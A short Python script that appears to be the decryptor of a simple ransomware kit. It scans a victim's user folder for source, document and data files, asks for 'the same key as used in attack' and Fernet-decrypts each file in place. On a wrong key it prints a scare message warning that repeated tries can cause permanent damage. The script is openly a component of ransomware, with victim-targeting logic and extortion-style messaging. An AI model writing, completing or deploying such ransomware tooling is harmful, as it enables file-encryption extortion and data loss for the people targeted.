import os
from cryptography.fernet import Fernet

target_location = 'C:/Users/ '      #Enter folder location of the target
files=[]

for dirpath, dirnames,filenames in os.walk(target_location):
 if(".git" in dirpath or "node_modules" in dirpath or "public" in dirpath or "assets" in dirpath or ".next" in dirpath or "coverage" in dirpath or ".vscode" in dirpath or "static" in dirpath):
    continue

 if("components" in dirpath or "public" in dirpath or "src" in dirpath or "app" in  dirpath or "lib" in dirpath or "models" in dirpath):

  for file in filenames:
    name,ext = os.path.splitext(file)  
    if ext == ".css" or ext == ".html" or ext == ".js" or ext == ".jsx" or ext == ".txt" or ext == ".pdf" or ext == ".doc"or ext == ".csv":

      file_path = os.path.join(dirpath,file)
      files.append(file_path)


key = input("Enter key: ")        # Enter the same key as used in attack
print("\n------------------------------\n")
try:
 for file in files:
   with open(file,"rb") as thefile:
     contents=thefile.read()
 
   encrypted = Fernet(key).decrypt(contents)
   print(os.path.basename(file),"saved...")
  
   with open(file,"wb") as theefile:
     theefile.write(encrypted)
except Exception as e:
  print("\n........INVALID KEY...........")
  print("REPEATED TRIES CAN CAUSE PERMANENT DAMAGE \n")
else:
  print("\n\n.......FILES ARE SAFE NOW........\n\n")